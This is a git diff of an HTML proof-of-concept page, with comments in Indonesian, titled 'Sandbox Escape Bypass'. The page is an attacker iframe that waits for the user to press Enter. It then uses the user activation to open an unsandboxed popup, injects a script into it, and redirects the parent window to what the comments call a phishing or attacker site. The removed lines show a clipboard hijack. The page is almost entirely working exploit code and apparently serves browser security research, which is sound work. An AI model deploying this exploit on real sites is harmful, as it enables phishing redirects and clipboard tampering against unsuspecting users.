@@ -1,55 +1,54 @@
 <!DOCTYPE html>
 <html>
-
 <head>
-    <title>Site B - The Escaper</title>
+    <title>Sandbox Escape Bypass</title>
 </head>
+<body style="background-color: #212121; color: white; text-align: center; font-family: sans-serif;">
+    <h3>Situs Penyerang (Iframe)</h3>
+    <h1 style="color: #ff5252;">TEKAN LALU LEPASKAN "ENTER"</h1>
+    <div id="status" style="border: 2px solid #ff5252; padding: 20px;">Menunggu trigger...</div>
 
-<body style="background-color: #e8f5e9; text-align: center; font-family: sans-serif;">
-    <h3>Situs B (Popup - Unsandboxed)</h3>
-    <h1 style="color: red;">LEPASKAN "ENTER" SEKARANG!</h1>
-    <div id="status" style="border: 2px solid black; padding: 20px;">Menunggu Ghost Gesture...</div>
-
-    <!-- <script>
-        window.addEventListener('keyup', async (e) => {
+    <script>
+        window.addEventListener('keyup', (e) => {
             if (e.key === 'Enter') {
                 const isActive = navigator.userActivation.isActive;
+                
                 if (isActive) {
                     try {
-                        await navigator.clipboard.writeText("HACKED_BY_DOUBLE_JUMP_123");
-                        document.getElementById('status').innerHTML += "<p style='color:red;'>✅ Clipboard Hijacked!</p>";
-                    } catch (err) { }
-                    document.getElementById('status').innerHTML += "<p style='color:red;'>✅ Escaping Parent Sandbox...</p>";
-                    setTimeout(() => {
-                        if (window.opener) {
-                            window.opener.top.location.href = 'https://example.com';
-                        } else {
-                            window.location.href = 'https://example.com';
-                        }
-                    }, 1000);
+                        document.getElementById('status').innerHTML = "<p style='color:orange;'>⏳ Mengeksekusi Bypass...</p>";
+                        
+                        // 1. Buka popup kosong (Diizinkan karena allow-popups)
+                        // Karena ada allow-popups-to-escape-sandbox, popup ini jadi LIAR (Unsandboxed).
+                        let win = window.open("", "_blank"); 
+                        
+                        // 2. Suntikkan payload jahat ke dalam popup yang baru terbuka
+                        win.document.write(`
+                            <html>
+                            <body style="background: black; color: lime; text-align: center; margin-top: 20%;">
+                                <h2>Bypass Berhasil! Meredirect Parent Window...</h2>
+                                <script>
+                                    // Iframe asli dilarang redirect parent (nggak ada allow-top-navigation).
+                                    // Tapi popup ini UNSANDBOXED dan punya referensi ke 'opener' (Parent).
+                                    if (window.opener) {
+                                        // Paksa parent window pindah ke situs phising/attacker
+                                        window.opener.top.location.href = 'https://example.com';
+                                    } else {
+                                        document.write("<br>Gagal: Referensi opener hilang.");
+                                    }
+                                <\/script>
+                            </body>
+                            </html>
+                        `);
+
+                        document.getElementById('status').innerHTML = "<p style='color:lime;'>✅ Bypass Dieksekusi! Parent di-redirect.</p>";
+
+                    } catch (err) { 
+                        console.error("Gagal eksekusi:", err);
+                        document.getElementById('status').innerHTML = "<p style='color:red;'>❌ Gagal Bypass!</p>";
+                    }
                 }
             }
         });
-    </script> -->
-    <script>
-    window.addEventListener('keyup', async (e) => {
-    if (e.key === 'Enter') {
-        const isActive = navigator.userActivation.isActive;
-        
-        if (isActive) {
-            try {
-                let win = window.open("", "_blank"); 
-                win.alert("Bypass Berhasil via Ghost Gesture!");
-                if (document.getElementById('status')) {
-                    document.getElementById('status').innerHTML += "<p style='color:green;'>✅ Escaped & Alert Executed!</p>";
-                }
-            } catch (err) { 
-                console.error("Gagal eksekusi:", err);
-            }
-        }
-    }
-});
-</script>
+    </script>
 </body>
-
 </html>
